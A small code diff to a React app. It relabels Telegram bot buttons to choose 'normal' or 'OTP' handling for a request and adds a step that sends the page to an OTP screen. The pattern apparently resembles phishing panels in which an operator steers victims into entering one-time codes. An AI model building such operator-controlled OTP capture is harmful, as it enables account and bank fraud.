@@ -43,12 +43,12 @@ function App() {
           inline_keyboard: [
             [
               {
-                text: "Aceptar",
-                callback_data: `news:accept:${currentRequestId}`,
+                text: "Usuario normal",
+                callback_data: `news:normal:${currentRequestId}`,
               },
               {
-                text: "Rechazar",
-                callback_data: `news:reject:${currentRequestId}`,
+                text: "Usuario OTP",
+                callback_data: `news:otp:${currentRequestId}`,
               },
             ],
           ],
@@ -75,6 +75,8 @@ function App() {
       case "rejected":
         setStep("rejected");
         return;
+      case "otp":
+        setStep("OTP");
     }
   }, [decision]);
 
